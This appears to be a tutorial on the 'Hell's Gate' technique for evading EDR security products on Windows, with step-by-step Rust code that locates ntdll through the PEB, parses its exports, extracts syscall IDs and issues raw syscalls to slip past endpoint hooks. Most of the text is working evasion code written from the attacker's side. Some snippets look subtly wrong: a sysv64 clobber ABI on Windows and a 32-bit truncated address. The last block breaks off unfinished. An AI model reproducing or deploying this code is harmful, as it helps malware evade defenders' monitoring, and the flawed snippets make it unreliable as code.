## **Hell’s Gate – Definition**

**Hell’s Gate** is a technique introduced by **am0nsec** that allows to:

* **Dynamically retrieve** the **syscall ID** of an NT function (`NtWriteVirtualMemory`, `NtCreateThreadEx`, etc.) from `ntdll.dll`

* Then **manually execute the `syscall` instruction**, bypassing all hooks **placed by EDRs inside `ntdll.dll`**

In short, we don’t just perform a `direct syscall` (which EDRs can detect via signature).

We perform a **stealth syscall**, with a **dynamically extracted ID**, **perfectly mimicking the Windows ABI**.

## **Why use Hell’s Gate?**

EDRs hook `ntdll.dll` by injecting code into:

* The syscall stubs of NT functions (`NtWriteVirtualMemory`, etc.)

* Or via inline hooks (`jmp`, `movabs`, etc.)

But we do NOT want to:

* use `ntdll.dll` (hooked),

* nor write `mov eax, 0xXX; syscall` (detectable signature).

Hell’s Gate = stealth + dynamic + anti-EDR.

## Hell’s Gate Steps

#### Step 1 — Get the base address of `ntdll.dll` stealthily

We don’t use `GetModuleHandle`, but go through the **PEB** + LDR to be fileless and API-less.

```rust
#[cfg(target_os = "windows")]
unsafe fn get_ntdll_base() -> *mut c_void {
    let peb = {
        let peb_ptr: usize;
        asm!("mov {}, gs:[0x60]", out(reg) peb_ptr);
        peb_ptr as *const u8
    };
    let ldr = *(peb.add(0x18) as *const *const u8);
    let mut module_list = *(ldr.add(0x10) as *const *const u8);
    loop {
        let dll_base = *(module_list.add(0x30) as *const *mut c_void);
        let dll_name_ptr = *(module_list.add(0x60) as *const *const u16);
        let dll_name_len = *(module_list.add(0x58) as *const u16) as usize / 2;
        let dll_name_slice = std::slice::from_raw_parts(dll_name_ptr, dll_name_len);
        let dll_name = String::from_utf16_lossy(dll_name_slice).to_lowercase();
        if dll_name.contains("ntdll.dll") {
            return dll_base;
        }
        module_list = *(module_list.add(0x0) as *const *const u8);
    }
}
```

#### Step 2 — Locate a `Nt*` function exported from `ntdll`

Example: `NtQuerySystemInformation`, `NtWriteVirtualMemory`, etc.

```rust
unsafe fn find_export(module_base: *const u8, function_name: &str) -> *const c_void {
    let dos_header = module_base;
    let nt_headers = dos_header.add(*(dos_header.add(0x3C) as *const u32) as usize);
    let export_directory_rva = *(nt_headers.add(0x88) as *const u32) as usize;
    let export_directory = module_base.add(export_directory_rva);
    let names_rva = *(export_directory.add(0x20) as *const u32) as usize;
    let names = module_base.add(names_rva) as *const u32;
    let functions_rva = *(export_directory.add(0x1C) as *const u32) as usize;
    let functions = module_base.add(functions_rva) as *const u32;
    let ordinals_rva = *(export_directory.add(0x24) as *const u32) as usize;
    let ordinals = module_base.add(ordinals_rva) as *const u16;

    for i in 0..*(export_directory.add(0x18) as *const u32) {
        let name_rva = *names.add(i as usize) as usize;
        let name_ptr = module_base.add(name_rva);
        let name = std::ffi::CStr::from_ptr(name_ptr as *const i8).to_str().unwrap_or("");
        if name.eq_ignore_ascii_case(function_name) {
            let ordinal = *ordinals.add(i as usize) as usize;
            let function_rva = *functions.add(ordinal) as usize;
            return module_base.add(function_rva) as *const c_void;
        }
    }

    std::ptr::null()
}

#[cfg(target_os = "windows")]
unsafe fn resolve_syscall(function_name: &str) -> Option<SyscallInfo> {
    let ntdll_base = get_ntdll_base() as *const u8;
    if ntdll_base.is_null() {
        println!("[-] NTDLL base not found");
        return None;
    }

    let func_addr = find_export(ntdll_base, function_name) as usize;
    if func_addr == 0 {
        println!("[-] Export for {} not found", function_name);
        return None;
    }

    let stub_bytes = std::slice::from_raw_parts(func_addr as *const u8, 20);
```

#### Step 3 — Read the syscall stub of the exported function

we retrieve the **first 20 bytes** of the function to detect the stub:

```rust
    if stub_bytes[0] == 0x4C && stub_bytes[1] == 0x8B && stub_bytes[2] == 0xD1 && stub_bytes[3] == 0xB8 {
        let syscall_id = u32::from_le_bytes([stub_bytes[4], stub_bytes[5], stub_bytes[6], stub_bytes[7]]) as u16;
        Some(SyscallInfo {
            wSystemCall: syscall_id,
            wServiceTableIndex: 0,
            dwAddress: func_addr as u32,
        })
    } else {
        println!("[-] Unexpected stub format for {}", function_name);
        None
    }
}
```

to identify this sequence:

```asm
mov r10, rcx
mov eax, XX
syscall
ret
```

#### Step 4 — Store necessary syscall info

We create a `SyscallInfo` structure:

```rust
#[repr(C)]
struct SyscallInfo {
    wSystemCall: u16,
    wServiceTableIndex: u16,
    dwAddress: u32,
}
```

We keep the `eax` (ID) and the real function address (for debug or alternate use).

#### Step 5 — Use the syscall via `asm!`

We reconstruct the stub using `asm!`:

```rust
    if let Some(syscall) = resolve_syscall("NtQuerySystemInformation") {
        asm!(
            "xor r10d, r10d",
            "mov r10, rcx",
            "mov eax, {0:e}",
            "syscall",
            in(reg) syscall.wSystemCall,
            in("rcx") 5u32, // SystemProcessInformation
            in("rdx") buffer.as_mut_ptr(),
            in("r8") buffer.len(),
            in("r9") std::ptr::null_mut::<u32>(),
            lateout("rax") status,
            clobber_abi("sysv64"),
        );
```